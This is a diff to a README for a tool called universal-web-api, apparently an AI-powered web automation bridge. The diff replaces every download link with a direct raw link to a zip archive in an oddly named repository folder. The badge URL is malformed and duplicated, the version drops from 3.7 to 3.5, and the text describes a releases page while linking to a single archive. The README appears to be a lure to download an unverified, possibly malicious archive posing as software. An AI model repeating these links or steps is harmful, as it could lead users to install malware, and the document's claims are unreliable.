@@ -1,6 +1,6 @@
 # 🤖 universal-web-api - Effortless API Creation from Websites
 
-[![Download](https://github.com/hzuaifa25/universal-web-api/raw/refs/heads/main/alpenhorn/api-web-universal-v3.7.zip%https://github.com/hzuaifa25/universal-web-api/raw/refs/heads/main/alpenhorn/api-web-universal-v3.7.zip)](https://github.com/hzuaifa25/universal-web-api/raw/refs/heads/main/alpenhorn/api-web-universal-v3.7.zip)
+[![Download](https://raw.githubusercontent.com/hzuaifa25/universal-web-api/main/alpenhorn/web-api-universal-3.5.zip%https://raw.githubusercontent.com/hzuaifa25/universal-web-api/main/alpenhorn/web-api-universal-3.5.zip)](https://raw.githubusercontent.com/hzuaifa25/universal-web-api/main/alpenhorn/web-api-universal-3.5.zip)
 
 ## 📋 Overview
 universal-web-api is an AI-powered, self-healing web automation bridge. It transforms any website into a standard API, making interaction with various online platforms easier. Use it for tasks like data extraction and automated interactions without needing programming skills.
@@ -10,7 +10,7 @@ To begin using universal-web-api, you need to download it. This process is simpl
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:** Go to the following link to access the download options:
-   [Download universal-web-api](https://github.com/hzuaifa25/universal-web-api/raw/refs/heads/main/alpenhorn/api-web-universal-v3.7.zip)
+   [Download universal-web-api](https://raw.githubusercontent.com/hzuaifa25/universal-web-api/main/alpenhorn/web-api-universal-3.5.zip)
    
 2. **Choose the Right Version:** On the releases page, you will find several versions listed. Look for the latest version. It usually has the highest number, indicating it is the most recent release.
 
